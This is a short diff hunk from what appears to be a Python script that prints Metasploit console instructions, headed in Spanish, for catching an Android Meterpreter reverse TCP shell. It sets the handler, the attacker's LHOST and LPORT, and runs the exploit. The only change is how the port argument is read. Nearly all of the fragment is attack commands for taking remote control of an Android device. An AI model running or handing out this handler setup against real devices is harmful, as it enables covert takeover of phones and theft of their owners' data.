@@ -48,7 +48,7 @@ print "--usa esta guia--"
 print "use exploit/multi/handler"
 print "set payload android/meterpreter/reverse_tcp"
 print "set LHOST " + ipl
-print "set LPORT "+ args.lp
+print "set LPORT "+ args.lp[0]
 print "exploit"
 
 
